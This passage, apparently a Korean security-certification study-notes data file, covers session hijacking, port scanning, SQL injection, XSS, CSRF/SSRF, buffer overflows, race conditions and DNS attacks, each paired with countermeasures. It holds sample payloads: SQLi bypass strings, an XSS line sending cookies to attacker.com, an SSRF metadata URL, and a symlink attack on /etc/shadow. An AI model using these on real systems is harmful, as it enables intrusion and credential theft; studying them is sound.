5. 희생자에게 RST 전송하여 연결 종료
6. 공격자가 세션 유지
\`\`\`

**ACK Storm:**
- Sequence Number 불일치로 인한 반복적 ACK 교환
- 세션 하이재킹의 증거

**Hunt 도구:**
- TCP 세션 하이재킹 공격 도구
- 스니핑 + 세션 탈취

**대응:**

| 방법 | 설명 |
|------|------|
| 암호화 | SSH, TLS 사용 |
| 재인증 | 중요 작업 시 재인증 요구 |
| ACK Storm 감지 | IDS로 비정상 ACK 탐지 |
| IP/MAC 바인딩 | 정적 ARP 설정 |

**예방:**
- 암호화된 프로토콜 사용 (SSH, HTTPS)
- 세션 타임아웃 설정
- 중요 작업 시 재인증
- 네트워크 모니터링
    `,
    keyPoints: ['Sequence Number 탈취', 'ACK Storm 발생', 'RST로 희생자 연결 종료', 'SSH/TLS로 방지'],
    isWeakness: true,
  },

  {
    id: 'port-scanning',
    category: 'network',
    subcategory: '스캐닝',
    title: '포트 스캐닝 기법',
    content: `
**스캔 유형:**

| 스캔 | 옵션 | 특징 |
|------|------|------|
| **TCP Connect** | -sT | 완전한 연결, 로그 남음 |
| **TCP SYN** | -sS | Half-Open, 로그 안남음 |
| **TCP FIN** | -sF | FIN 플래그만 |
| **TCP NULL** | -sN | 플래그 없음 |
| **TCP Xmas** | -sX | URG+PSH+FIN |
| **UDP** | -sU | ICMP Unreachable로 판단 |
| **ACK** | -sA | 방화벽 룰셋 확인 |

**TCP SYN 스캔 (포트 오픈):**
\`\`\`
공격자 → SYN → 서버
공격자 ← SYN+ACK ← 서버 (포트 열림)
공격자 → RST → 서버 (연결 중단)
\`\`\`

**FIN/NULL/Xmas 스캔:**
\`\`\`
포트 열림: 응답 없음
포트 닫힘: RST+ACK
\`\`\`

**Nmap 주요 옵션:**
\`\`\`bash
nmap -sS 192.168.1.0/24      # SYN 스캔
nmap -O 192.168.1.1          # OS 탐지
nmap -sV 192.168.1.1         # 서비스 버전
nmap -D RND:10 192.168.1.1   # Decoy (위장)
nmap -T0 192.168.1.1         # 아주 느리게 (탐지 회피)
\`\`\`

**대응:**
- 불필요한 포트 차단
- IDS/IPS 설정
- 포트 스캔 탐지 로그
    `,
    keyPoints: ['-sS=SYN 스캔', '-sT=Connect 스캔', 'FIN/NULL/Xmas=스텔스', '-D=Decoy 스캔'],
    isWeakness: true,
  },

  // ==================== 웹 보안 ====================
  {
    id: 'sql-injection',
    category: 'app',
    subcategory: '웹공격',
    title: 'SQL Injection 공격',
    content: `
**SQL Injection 유형:**

| 유형 | 방식 | 특징 |
|------|------|------|
| **Form SQL Injection** | 입력 폼 조작 | 가장 기본적 |
| **Union SQL Injection** | UNION SELECT | 데이터 추출 |
| **Error-based** | 에러 메시지 활용 | 정보 유출 |
| **Blind SQL Injection** | 참/거짓 응답 | 직접 출력 없음 |

**공격 예시:**
\`\`\`sql
# 인증 우회
' OR '1'='1'--
' OR 1=1--
admin'--

# Union 기반
' UNION SELECT username, password FROM users--

# Error 기반 (MySQL)
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--

# Blind (Boolean)
' AND 1=1--  (참)
' AND 1=2--  (거짓)

# Blind (Time)
' AND SLEEP(5)--
\`\`\`

**대응:**

| 방법 | 설명 |
|------|------|
| **Prepared Statement** | 파라미터 바인딩 |
| **입력값 검증** | 특수문자 필터링 |
| **에러 메시지 숨김** | 상세 에러 미노출 |
| **최소 권한** | DB 계정 권한 제한 |
| **WAF** | 웹 방화벽 적용 |

**필터링 특수문자:**
\`' " - ; * = ?\`
    `,
    keyPoints: ['Prepared Statement 사용', '특수문자 필터링', '에러 메시지 숨김', 'WAF 적용'],
    isWeakness: true,
  },

  {
    id: 'xss-attacks',
    category: 'app',
    subcategory: '웹공격',
    title: 'XSS (Cross-Site Scripting)',
    content: `
**XSS 유형:**

| 유형 | 저장 | 실행 위치 | 특징 |
|------|------|-----------|------|
| **Stored XSS** | 서버 DB | 피해자 브라우저 | 게시판 등에 저장 |
| **Reflected XSS** | X | 피해자 브라우저 | URL 파라미터 |
| **DOM-based XSS** | X | 클라이언트 DOM | 서버 미경유 |

**공격 예시:**
\`\`\`html
# 쿠키 탈취
<script>document.location='http://attacker.com/steal?c='+document.cookie</script>

# 이미지 태그
<img src="x" onerror="alert('XSS')">

# 이벤트 핸들러
<body onload="alert('XSS')">

# SVG
<svg onload="alert('XSS')">

# URL 인코딩 우회
%3Cscript%3Ealert(1)%3C/script%3E
\`\`\`

**대응:**

| 방법 | 설명 |
|------|------|
| **출력 인코딩** | HTML Entity 변환 |
| **입력 검증** | 화이트리스트 방식 |
| **CSP** | Content-Security-Policy |
| **HttpOnly** | 쿠키 JS 접근 차단 |

**필터링 특수문자:**
\`< > & " ' ? /\`

**HTML Entity 변환:**
\`\`\`
< → &lt;
> → &gt;
& → &amp;
" → &quot;
' → &#x27;
\`\`\`
    `,
    keyPoints: ['Stored=서버 저장', 'Reflected=URL 파라미터', 'HttpOnly 쿠키', 'CSP 헤더 설정'],
    isWeakness: true,
  },

  {
    id: 'csrf-ssrf',
    category: 'app',
    subcategory: '웹공격',
    title: 'CSRF / SSRF',
    content: `
**CSRF (Cross-Site Request Forgery):**
\`\`\`
XSS: 사용자 브라우저에서 악성 스크립트 실행 (클라이언트 피해)
CSRF: 사용자 권한으로 서버에 요청 (서버 측 상태 변경)
\`\`\`

**CSRF 공격 예시:**
\`\`\`html
# 이미지 태그로 GET 요청
<img src="https://bank.com/transfer?to=attacker&amount=1000">

# 폼으로 POST 요청
<form action="https://bank.com/transfer" method="POST">
  <input type="hidden" name="to" value="attacker">
  <input type="hidden" name="amount" value="1000">
</form>
<script>document.forms[0].submit();</script>
\`\`\`

**CSRF 대응:**

| 방법 | 설명 |
|------|------|
| **CSRF Token** | 랜덤 토큰 검증 |
| **Referer 검증** | 요청 출처 확인 |
| **SameSite Cookie** | 쿠키 전송 제한 |
| **재인증** | 중요 작업 시 비밀번호 확인 |

**SSRF (Server-Side Request Forgery):**
\`\`\`
서버가 외부 입력 기반으로 내부 시스템에 요청
→ 내부 시스템 스캔, 정보 탈취
\`\`\`

**SSRF 공격 예시:**
\`\`\`
# 내부 서버 접근
http://example.com/fetch?url=http://192.168.1.1/admin

# 메타데이터 서비스 (AWS)
http://169.254.169.254/latest/meta-data/
\`\`\`

**SSRF 대응:**
- URL 화이트리스트
- 내부 IP 차단
- 메타데이터 서비스 접근 제한
    `,
    keyPoints: ['CSRF=사용자 권한 악용', 'CSRF Token 사용', 'SSRF=내부 시스템 접근', 'URL 화이트리스트'],
    isWeakness: true,
  },

  {
    id: 'web-security-headers',
    category: 'app',
    subcategory: '웹보안',
    title: '웹 보안 헤더',
    content: `
**주요 보안 헤더:**

| 헤더 | 용도 | 설정 예시 |
|------|------|-----------|
| **Content-Security-Policy** | XSS 방지 | default-src 'self' |
| **X-Content-Type-Options** | MIME 스니핑 방지 | nosniff |
| **X-Frame-Options** | 클릭재킹 방지 | DENY, SAMEORIGIN |
| **Strict-Transport-Security** | HTTPS 강제 | max-age=31536000 |
| **X-XSS-Protection** | XSS 필터 (레거시) | 1; mode=block |

**CSP (Content-Security-Policy):**
\`\`\`
Content-Security-Policy:
  default-src 'self';
  script-src 'self' https://trusted.com;
  style-src 'self' 'unsafe-inline';
  img-src *;
  connect-src 'self' https://api.example.com;
\`\`\`

**HSTS (Strict-Transport-Security):**
\`\`\`
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
\`\`\`

**X-Frame-Options:**
\`\`\`
DENY: 프레임 내 표시 금지
SAMEORIGIN: 같은 출처만 허용
ALLOW-FROM uri: 특정 출처만 허용
\`\`\`

**쿠키 보안 속성:**

| 속성 | 용도 |
|------|------|
| **HttpOnly** | JavaScript 접근 차단 |
| **Secure** | HTTPS에서만 전송 |
| **SameSite** | CSRF 방지 (Strict/Lax/None) |
    `,
    keyPoints: ['CSP=XSS 방지', 'HSTS=HTTPS 강제', 'HttpOnly=쿠키 보호', 'SameSite=CSRF 방지'],
    isWeakness: false,
  },

  // ==================== 데이터베이스 보안 ====================
  {
    id: 'db-encryption',
    category: 'app',
    subcategory: '데이터베이스',
    title: 'DB 암호화 방식',
    content: `
**DB 암호화 방식:**

| 방식 | 암호화 위치 | 장점 | 단점 |
|------|-------------|------|------|
| **API 방식** | 애플리케이션 서버 | 독립적, 유연 | 앱 수정 필요 |
| **Plug-in 방식** | DB 서버 | 앱 수정 불필요 | DB 부하 |
| **TDE** | DBMS 내장 | 투명한 암복호화 | DB 의존적 |
| **Hybrid** | 복합 | 유연성 | 복잡 |

**API 방식:**
\`\`\`
[애플리케이션] → [암호화 라이브러리] → [DB]
- 애플리케이션에서 암복호화 수행
- DB는 암호화된 데이터만 저장
\`\`\`

**Plug-in 방식:**
\`\`\`
[애플리케이션] → [DB 서버] → [암호화 플러그인]
- DBMS에서 암복호화 수행
- 앱 수정 없이 적용 가능
\`\`\`

**TDE (Transparent Data Encryption):**
\`\`\`
[애플리케이션] → [DBMS 내장 암호화] → [데이터 파일]
- DBMS가 자동으로 암복호화
- 데이터 파일 수준 암호화
\`\`\`

**DB 보안 위협:**

| 위협 | 설명 |
|------|------|
| **집성** | 낮은 수준 정보 모아 높은 수준 정보 추론 |
| **추론** | 공개된 정보로 비공개 정보 유추 |

**대응:**
- 뷰(View) 활용
- 접근 권한 분리
- 질의 모니터링
    `,
    keyPoints: ['API=앱에서 암호화', 'Plug-in=DB서버에서', 'TDE=DBMS 내장', '집성/추론 공격 방지'],
    isWeakness: true,
  },

  // ==================== 보안 솔루션 ====================
  {
    id: 'ids-ips',
    category: 'security',
    subcategory: '솔루션',
    title: 'IDS/IPS 탐지 방식',
    content: `
**탐지 방식:**

| 방식 | 특징 | 장점 | 단점 |
|------|------|------|------|
| **오용 탐지** | 알려진 공격 패턴 매칭 | 오탐 낮음, 정확 | 신규 공격 탐지 불가 |
| **이상 탐지** | 정상 행위 기준 이탈 탐지 | 제로데이 탐지 | 오탐 높음 |

**오용 탐지 (Misuse Detection):**
- 시그니처/패턴 기반
- 전문가 시스템, 상태전이, 패턴매칭

**이상 탐지 (Anomaly Detection):**
- 통계적 분석
- 정상 프로파일 이탈 감지
- 제로데이 공격 탐지 가능

**오탐/미탐:**

| 용어 | 설명 |
|------|------|
| **False Positive (오탐)** | 정상을 공격으로 잘못 탐지 |
| **False Negative (미탐)** | 공격을 정상으로 잘못 판단 |

**NIDS vs HIDS:**

| 유형 | 설치 위치 | 탐지 범위 |
|------|-----------|-----------|
| **NIDS** | 네트워크 | 패킷 분석 |
| **HIDS** | 호스트 | 시스템 활동, 파일 변경 |

**Snort:**
- 대표적인 오픈소스 NIDS
- 시그니처 기반 탐지
- 설정에 따라 IPS로 동작 가능
    `,
    keyPoints: ['오용탐지=패턴 기반', '이상탐지=정상 기준 이탈', 'False Positive=오탐', 'False Negative=미탐'],
    isWeakness: true,
  },

  {
    id: 'firewall-architecture',
    category: 'security',
    subcategory: '솔루션',
    title: '방화벽 구성 방식',
    content: `
**방화벽 구성 방식:**

| 구성 | 설명 | 보안 수준 |
|------|------|-----------|
| **스크리닝 라우터** | 라우터에서 패킷 필터링 | 낮음 |
| **Dual-Homed Host** | 베스천 호스트 단독 구성 | 중간 |
| **Screened Host** | 라우터 + 베스천 호스트 | 중상 |
| **Screened Subnet** | 라우터 + 베스천 + 라우터 (DMZ) | 높음 |

**베스천 호스트 (Bastion Host):**
- 내부 네트워크 보호를 위한 보안 강화 호스트
- 불필요한 서비스 제거
- 강력한 인증

**DMZ (Demilitarized Zone):**
- 외부와 내부 네트워크 사이의 완충 영역
- 웹서버, 메일서버 등 공개 서버 배치
- 외부 라우터 + 내부 라우터로 보호

**방화벽 정책:**

| 정책 | 설명 |
|------|------|
| **Whitelist** | 허용할 것만 정의, 나머지 차단 |
| **Blacklist** | 차단할 것만 정의, 나머지 허용 |

**iptables 정책:**
\`\`\`
DROP: 패킷 무시, 응답 없음
REJECT: 패킷 거부, 거부 메시지 전송
\`\`\`
    `,
    keyPoints: ['Screened Subnet=DMZ 구성', '베스천 호스트=보안 강화', 'Whitelist 권장', 'DROP vs REJECT'],
    isWeakness: true,
  },

  {
    id: 'security-solutions',
    category: 'security',
    subcategory: '솔루션',
    title: '보안 솔루션 종류',
    content: `
**보안 솔루션:**

| 솔루션 | 설명 |
|--------|------|
| **ESM** | 보안 정책 반영, 이벤트/로그 통합관리 |
| **UTM** | IDS/IPS/VPN/스팸/백신 통합 제공 |
| **SIEM** | 로그 분석 후 이상 징후 보고 |
| **SOAR** | 보안 위협 분석/대응 자동화 |
| **NAC** | 네트워크 접근 단말 인증 및 통제 |
| **DLP** | 정보 유출 방지 |
| **WAF** | 웹 애플리케이션 방화벽 |

**WAF (Web Application Firewall):**
- OSI 7계층 (애플리케이션) 검사
- HTTP/HTTPS 트래픽 분석
- 보호 대상: SQL Injection, XSS, CSRF, 파일 업로드 등

**NAC (Network Access Control):**
- 네트워크 진입 단말 인증
- 보안 취약점 점검
- 미준수 단말 격리/치료

**SIEM (Security Information and Event Management):**
- 다양한 소스의 로그 수집
- 상관 분석
- 이상 징후 탐지 및 알림

**클라우드 보안:**

| 서비스 | 설명 |
|--------|------|
| **SECaaS** | 보안 기능을 클라우드 서비스로 제공 |
| **CASB** | 클라우드 서비스 접근 보안 |
    `,
    keyPoints: ['ESM=통합관리', 'UTM=통합보안장비', 'SIEM=로그분석', 'WAF=웹 방화벽'],
    isWeakness: false,
  },

  // ==================== 접근통제/법규 ====================
  {
    id: 'access-control-models',
    category: 'law',
    subcategory: '접근통제',
    title: '접근통제 모델 비교',
    content: `
**접근통제 모델:**

| 모델 | 특징 | 사용 환경 |
|------|------|-----------|
| **DAC** | 소유자가 권한 부여 | 일반 기업, 유닉스 |
| **MAC** | 시스템이 강제 통제 | 군사, 정부 기밀 |
| **RBAC** | 역할 기반 권한 | 대기업, ERP |
| **ABAC** | 속성 기반 권한 | 클라우드, 복잡한 환경 |

**MAC 보안 모델:**

| 모델 | 목적 | 규칙 |
|------|------|------|
| **Bell-LaPadula** | 기밀성 | No Read Up, No Write Down |
| **Biba** | 무결성 | No Read Down, No Write Up |
| **Clark-Wilson** | 무결성 | 직무분리, 절차 기반 변경 |
| **Chinese Wall** | 이해충돌 방지 | 한번 선택 시 경쟁집단 접근 불가 |

**Bell-LaPadula (기밀성):**
\`\`\`
No Read Up: 상위 등급 읽기 불가
No Write Down: 하위 등급 쓰기 불가
→ 정보 유출 방지
\`\`\`

**Biba (무결성):**
\`\`\`
No Read Down: 하위 등급 읽기 불가
No Write Up: 상위 등급 쓰기 불가
→ 정보 오염 방지
\`\`\`

**RBAC 구성요소:**
- 사용자 (User)
- 역할 (Role)
- 권한 (Permission)
- 세션 (Session)
    `,
    keyPoints: ['DAC=소유자 결정', 'MAC=시스템 강제', 'BLP=기밀성, No Read Up', 'Biba=무결성, No Write Up'],
    isWeakness: true,
  },

  {
    id: 'risk-management',
    category: 'law',
    subcategory: '위험 관리',
    title: '위험 관리 프로세스',
    content: `
**위험 관리 3요소:**

| 요소 | 정의 | 예시 |
|------|------|------|
| **자산** | 보호해야 할 대상 | 서버, 데이터, 개인정보 |
| **위협** | 자산에 손실을 발생시키는 원인 | 해킹, 자연재해, 내부자 |
| **취약점** | 위협에 의해 손실 가능성을 높이는 약점 | 패치 미적용, 약한 암호 |

**위험 = 자산 x 위협 x 취약점**

**위험평가 3단계:**
\`\`\`
1. 위험 식별 (Risk Identification)
   - 잠재 위험 발견, 자산/위협/취약점 목록화

2. 위험 분석 (Risk Analysis)
   - 가능성과 영향 분석
   - 정량적/정성적 방법

3. 위험 평가 (Risk Evaluation)
   - 허용 수준(DoA)과 비교
   - 우선순위 결정
\`\`\`

**위험 분석 방법:**

| 방법 | 유형 | 특징 |
|------|------|------|
| 델파이법 | 정성적 | 전문가 의견 수렴 |
| 시나리오법 | 정성적 | 가상 시나리오 분석 |
| 과거자료분석 | 정량적 | 역사적 데이터 활용 |
| 수학공식접근 | 정량적 | 공식으로 계산 |

**위험 처리 전략:**
- 위험 수용 (Accept)
- 위험 회피 (Avoid)
- 위험 전가 (Transfer): 보험, 외주
- 위험 감소 (Mitigate): 통제 적용
    `,
    keyPoints: ['위험=자산x위협x취약점', '델파이=전문가 의견', '위험전가=보험/외주', 'DoA=허용 위험 수준'],
    isWeakness: true,
  },

  {
    id: 'incident-response',
    category: 'law',
    subcategory: '침해사고',
    title: '침해사고 대응 7단계',
    content: `
**침해사고 대응 7단계:**

| 단계 | 주요 활동 |
|------|-----------|
| 1. **준비** | CERT 구성, 대응 계획 수립, 도구 준비 |
| 2. **탐지** | 모니터링, 로그 분석, 이상 징후 식별 |
| 3. **초기 대응** | 피해 확산 방지, 증거 보존, 시스템 격리 |
| 4. **전략 체계화** | 대응 우선순위, 자원 배분, 커뮤니케이션 |
| 5. **조사** | 포렌식 분석, 공격 경로 파악, 영향 범위 |
| 6. **보고서** | 사고 경위, 피해 규모, 재발 방지책 |
| 7. **해결** | 시스템 복구, 패치 적용, 모니터링 강화 |

**증거 수집 우선순위 (휘발성 순서):**
\`\`\`
1. 레지스터/캐시 (가장 휘발성 높음)
2. 메모리
3. 네트워크 연결 상태
4. 실행 중인 프로세스
5. 디스크
6. 외부 저장매체 (가장 휘발성 낮음)
\`\`\`

**포렌식 도구:**
- EnCase
- FTK (Forensic Toolkit)
- Volatility (메모리 분석)

**무결성 점검 도구:**
- Tripwire
- Fcheck
- Samhain
    `,
    keyPoints: ['7단계: 준비→탐지→초기대응→전략→조사→보고→해결', '초기 대응에서 증거 보존', '휘발성 순서로 증거 수집'],
    isWeakness: true,
  },

  {
    id: 'bia-rto-rpo',
    category: 'law',
    subcategory: '업무연속성',
    title: 'BIA / RTO / RPO',
    content: `
**BIA (Business Impact Analysis):**
업무 중단 시 영향을 분석하여 복구 목표를 결정하는 절차

**핵심 지표:**

| 지표 | 정의 | 예시 |
|------|------|------|
| **RTO** | 목표 복구 시간 | 4시간 이내 복구 |
| **RPO** | 목표 복구 시점 | 1시간 전 데이터까지 복구 |
| **MTPD** | 최대 허용 중단 시간 | 24시간 |

**RTO와 RPO:**
\`\`\`
       RPO           RTO
        ↓             ↓
━━━━━━━━●━━━━━━━━━━━━━●━━━━━━━━━
    마지막 백업   사고 발생    복구 완료

RPO: "얼마나 오래된 데이터까지 허용할 것인가"
RTO: "얼마나 빨리 복구해야 하는가"
\`\`\`

**재해복구 사이트 유형:**

| 유형 | RTO | 특징 |
|------|-----|------|
| **Mirror Site** | 즉시 | 실시간 동기화, Active-Active |
| **Hot Site** | 수 시간 | 장비 준비, 데이터 동기화 |
| **Warm Site** | 수 일 | 장비 준비, 데이터는 백업에서 |
| **Cold Site** | 수 주 | 공간만 확보 |
    `,
    keyPoints: ['BIA=업무영향분석', 'RTO=복구시간', 'RPO=복구시점', 'Mirror>Hot>Warm>Cold'],
    isWeakness: true,
  },

  {
    id: 'cvss-cve',
    category: 'law',
    subcategory: '취약점',
    title: 'CVSS / CVE / CWE',
    content: `
**취약점 정보 분류 체계:**

| 체계 | 설명 | 형식 |
|------|------|------|
| **CVE** | 공개된 취약점 식별자 | CVE-연도-번호 |
| **CWE** | 취약점 유형 분류 | CWE-번호 |
| **CVSS** | 취약점 심각도 점수 | 0.0 ~ 10.0 |
| **CPE** | 제품 식별자 | cpe:2.3:a:vendor:product |

**CVSS 기본 메트릭:**
\`\`\`
- 공격 벡터 (AV): Network/Adjacent/Local/Physical
- 공격 복잡도 (AC): Low/High
- 권한 필요 (PR): None/Low/High
- 사용자 상호작용 (UI): None/Required
- 영향 범위 (S): Unchanged/Changed
- 기밀성/무결성/가용성 영향 (C/I/A): None/Low/High
\`\`\`

**CVSS 심각도 등급:**

| 점수 | 등급 |
|------|------|
| 0.0 | None |
| 0.1 ~ 3.9 | Low |
| 4.0 ~ 6.9 | Medium |
| 7.0 ~ 8.9 | High |
| 9.0 ~ 10.0 | Critical |

**주요 CWE:**
- CWE-89: SQL Injection
- CWE-79: XSS
- CWE-22: Path Traversal
- CWE-20: 부적절한 입력 검증
    `,
    keyPoints: ['CVE=취약점 ID', 'CWE=취약점 유형', 'CVSS=심각도 점수', '9.0 이상=Critical'],
    isWeakness: true,
  },

  {
    id: 'isms-p',
    category: 'law',
    subcategory: '인증',
    title: 'ISMS-P / ISO 27001',
    content: `
**ISMS-P 인증:**
정보보호 및 개인정보보호 관리체계 인증

**인증 구성:**
- ISMS (정보보호 관리체계)
- PIMS (개인정보보호 관리체계)
- ISMS-P (통합 인증)

**ISO/IEC 27000 시리즈:**

| 표준 | 내용 |
|------|------|
| ISO 27000 | 개관 및 용어 |
| ISO 27001 | ISMS 요구사항 |
| ISO 27002 | 정보보안 통제 실무 |
| ISO 27005 | 정보보안 위험관리 지침 |
| ISO 27014 | 정보보호 거버넌스 |

**ISO 15408 (Common Criteria):**
- 정보보안 제품 평가 기준
- EAL1 ~ EAL7 등급

**주요 보안 책임자:**

| 역할 | 설명 |
|------|------|
| **CISO** | 정보보호 최고책임자 |
| **DPO/CPO** | 개인정보 보호책임자 |

**개인정보 수집 동의 고지 항목:**
- 수집/이용 목적
- 수집하려는 개인정보 항목
- 보유 및 이용 기간
    `,
    keyPoints: ['ISMS-P=통합 인증', 'ISO 27001=ISMS 요구사항', 'CISO=정보보호 책임자', 'CPO=개인정보 책임자'],
    isWeakness: false,
  },

  // ==================== 주요 포트 ====================
  {
    id: 'common-ports',
    category: 'network',
    subcategory: '기본',
    title: '주요 포트 번호',
    content: `
**주요 서비스 포트:**

| 포트 | 프로토콜 | 설명 |
|------|----------|------|
| 20 | FTP-Data | 파일 전송 데이터 |
| 21 | FTP | 파일 전송 제어 |
| 22 | SSH | 보안 원격 접속 |
| 23 | Telnet | 원격 접속 (암호화X) |
| 25 | SMTP | 메일 전송 |
| 53 | DNS | 도메인 네임 |
| 67/68 | DHCP | IP 주소 할당 |
| 69 | TFTP | 단순 파일 전송 |
| 80 | HTTP | 웹 서비스 |
| 110 | POP3 | 메일 수신 |
| 123 | NTP | 시간 동기화 |
| 143 | IMAP | 메일 수신 (동기화) |
| 161/162 | SNMP | 네트워크 관리 |
| 389 | LDAP | 디렉터리 서비스 |
| 443 | HTTPS | 보안 웹 서비스 |
| 465 | SMTPS | 보안 메일 전송 |
| 993 | IMAPS | 보안 메일 수신 |
| 995 | POP3S | 보안 메일 수신 |

**보안 관련:**
- 23(Telnet) → 22(SSH) 사용 권장
- 80(HTTP) → 443(HTTPS) 사용 권장
- 69(TFTP): 인증 없음, 취약

**SNMP:**
- 161/UDP: Agent (관리 대상)
- 162/UDP: Manager (Trap 수신)
- 커뮤니티 스트링 변경 필수
    `,
    keyPoints: ['22=SSH', '443=HTTPS', 'Telnet→SSH 권장', 'SNMP=161/162'],
    isWeakness: false,
  },

  // ==================== 무선 보안 ====================
  {
    id: 'wireless-security',
    category: 'network',
    subcategory: '무선',
    title: '무선랜 보안',
    content: `
**무선랜 보안 프로토콜:**

| 프로토콜 | 암호화 | 인증 | 보안 수준 |
|----------|--------|------|-----------|
| **WEP** | RC4 | 공유키 | 취약, 사용 금지 |
| **WPA** | RC4-TKIP | PSK/802.1x | 취약점 존재 |
| **WPA2** | AES-CCMP | PSK/802.1x | 현재 표준 |
| **WPA3** | SAE/AES-GCMP | SAE/802.1x | 최신 |

**WEP 취약점:**
- 짧은 IV (24비트)
- RC4 알고리즘 취약
- 고정 키 사용

**WPA2-개인 (PSK):**
- 사전 공유키 (Pre-Shared Key)
- 4-Way Handshake로 키 교환
- 사전 공격에 취약

**WPA2-기업 (802.1x/EAP):**
- RADIUS 서버 기반 인증
- EAP 프로토콜 사용
- 개별 사용자 인증

**무선랜 공격:**

| 공격 | 설명 |
|------|------|
| Rouge AP | 불법 AP 설치 |
| Evil Twin | 정상 AP 위장 |
| KRACK | WPA2 키 재설치 공격 |

**블루투스 공격:**

| 공격 | 설명 |
|------|------|
| Blueprinting | 공격 장치 검색 |
| Bluesnarfing | 파일 접근 |
| Bluebugging | 임의 명령 실행 |
| Bluejacking | 스팸 전송 |
    `,
    keyPoints: ['WPA2-AES 권장', 'WEP 사용 금지', 'WPA3=최신', 'Bluesnarfing=파일 접근'],
    isWeakness: true,
  },

  // ==================== 시스템 공격 ====================
  {
    id: 'buffer-overflow',
    category: 'system',
    subcategory: '공격',
    title: '버퍼 오버플로우',
    content: `
**버퍼 오버플로우 유형:**

| 유형 | 공격 대상 | 특징 |
|------|-----------|------|
| **스택 BOF** | 스택 영역 | RET 주소 변조 |
| **힙 BOF** | 힙 영역 | 함수 포인터 변조 |

**스택 메모리 구조:**
\`\`\`
높은 주소
┌─────────────┐
│   인자값     │
├─────────────┤
│   RET 주소   │ ← 공격 대상
├─────────────┤
│   SFP (EBP) │
├─────────────┤
│  지역 변수   │ ← 오버플로우 시작
└─────────────┘
낮은 주소
\`\`\`

**공격 과정:**
1. 버퍼보다 큰 입력으로 스택 덮어쓰기
2. RET 주소를 셸코드 주소로 변조
3. 함수 종료 시 셸코드 실행

**대응:**

| 방법 | 설명 |
|------|------|
| **스택 가드** | 카나리 값 검증 |
| **스택 쉴드** | RET 주소 별도 저장/비교 |
| **ASLR** | 주소 공간 무작위화 |
| **DEP/NX** | 실행 방지 비트 |
| **보안 코딩** | strlen 검증, 안전한 함수 사용 |

**ASLR 설정 (Linux):**
\`\`\`bash
# 비활성화
echo 0 > /proc/sys/kernel/randomize_va_space

# 힙 제외 활성화
echo 1 > /proc/sys/kernel/randomize_va_space

# 완전 활성화
echo 2 > /proc/sys/kernel/randomize_va_space
\`\`\`
    `,
    keyPoints: ['RET 주소 변조', 'ASLR=주소 무작위화', '스택 가드=카나리 값', 'DEP/NX=실행 방지'],
    isWeakness: true,
  },

  {
    id: 'race-condition',
    category: 'system',
    subcategory: '공격',
    title: '레이스 컨디션 공격',
    content: `
**레이스 컨디션:**
둘 이상의 프로세스가 공유 자원에 동시 접근 시 비정상적인 결과 발생

**공격 과정:**
\`\`\`
1. SetUID 프로그램이 임시 파일 생성
2. 공격자가 임시 파일에 심볼릭 링크 생성
3. 링크 대상: /etc/shadow 등 중요 파일
4. SetUID 프로그램이 링크된 파일 수정
5. 중요 파일이 공격자가 원하는 내용으로 변경
\`\`\`

**예시:**
\`\`\`bash
# 1. 임시 파일 삭제
rm /tmp/tmpfile

# 2. 심볼릭 링크 생성
ln -s /etc/shadow /tmp/tmpfile

# 3. SetUID 프로그램 실행
./vulnerable_program

# 4. /etc/shadow 파일 변조됨
\`\`\`

**대응:**

| 방법 | 설명 |
|------|------|
| 임시 파일 생성 금지 | 가능하면 임시 파일 사용 안함 |
| 파일 존재 확인 | 이미 존재하면 생성/쓰기 금지 |
| 링크 파일 검사 | 심볼릭 링크면 실행 중단 |
| umask 설정 | 022 이상 유지 |
| 안전한 함수 사용 | mkstemp() 사용 |

**안전한 임시 파일 생성:**
\`\`\`c
int fd = mkstemp("/tmp/tmpXXXXXX");
// 원자적 생성 + 유일한 이름
\`\`\`
    `,
    keyPoints: ['공유 자원 동시 접근', '심볼릭 링크 악용', 'mkstemp() 사용', 'umask 022 이상'],
    isWeakness: true,
  },

  {
    id: 'format-string',
    category: 'system',
    subcategory: '공격',
    title: '포맷 스트링 공격',
    content: `
**포맷 스트링 취약점:**
외부 입력을 검증 없이 포맷 스트링으로 사용

**취약한 코드:**
\`\`\`c
// 취약
printf(user_input);

// 안전
printf("%s", user_input);
\`\`\`

**포맷 지정자:**

| 지정자 | 기능 |
|--------|------|
| %d | 10진수 정수 출력 |
| %x | 16진수 정수 출력 |
| %s | 문자열 출력 |
| **%n** | 출력된 바이트 수를 메모리에 저장 |

**공격 기법:**
\`\`\`
# 메모리 읽기
%x%x%x%x  → 스택 내용 출력

# 메모리 쓰기 (%n 악용)
AAAA%n    → 특정 주소에 값 쓰기
\`\`\`

**공격 가능 행위:**
- 프로세스 충돌
- 메모리 내용 읽기
- 임의 메모리 덮어쓰기
- Return Address 변조

**대응:**
- printf("%s", input) 형태로 사용
- 입력값 검증
- 포맷 스트링 하드코딩
- 컴파일러 경고 활성화 (-Wformat)
    `,
    keyPoints: ['%n=메모리 쓰기', 'printf("%s", input) 사용', '직접 포맷 스트링 금지', '%x=메모리 읽기'],
    isWeakness: true,
  },

  // ==================== DNS/이메일 보안 ====================
  {
    id: 'dns-attacks',
    category: 'network',
    subcategory: 'DNS',
    title: 'DNS 공격 및 보안',
    content: `
**DNS Spoofing:**
\`\`\`
1. ARP Spoofing으로 DNS 트래픽 스니핑
2. DNS 질의의 Transaction ID 확인
3. 위조된 DNS 응답을 먼저 전송
4. 희생자가 가짜 사이트로 접속
\`\`\`

**DNS Cache Poisoning:**
\`\`\`
1. DNS 서버에 대량의 조작된 응답 전송
2. Transaction ID, Port 무작위 대입
3. 정상 응답보다 먼저 일치하면 캐시 오염
4. 해당 도메인 질의 시 가짜 IP 반환
\`\`\`

**대응:**

| 방법 | 설명 |
|------|------|
| **DNSSEC** | DNS 응답 서명 검증 (무결성) |
| 재귀 질의 제한 | 외부 서버의 재귀 질의 거부 |
| 캐시 TTL 관리 | 짧은 TTL 설정 |
| Source Port 무작위화 | 예측 어렵게 |

**DNSSEC:**
- DNS 응답에 전자서명 추가
- 무결성 + 출처 인증
- **기밀성은 제공하지 않음**

**DNS 레코드:**

| 레코드 | 용도 |
|--------|------|
| A | 도메인 → IPv4 |
| AAAA | 도메인 → IPv6 |
| MX | 메일 서버 |
| NS | 네임 서버 |
| PTR | IP → 도메인 (역방향) |
| CNAME | 별칭 |
| TXT | 텍스트 정보 (SPF 등) |
    `,
    keyPoints: ['DNS Spoofing=응답 위조', 'Cache Poisoning=캐시 오염', 'DNSSEC=서명 검증', '기밀성 X'],
    isWeakness: true,
  },

  {
    id: 'email-security',
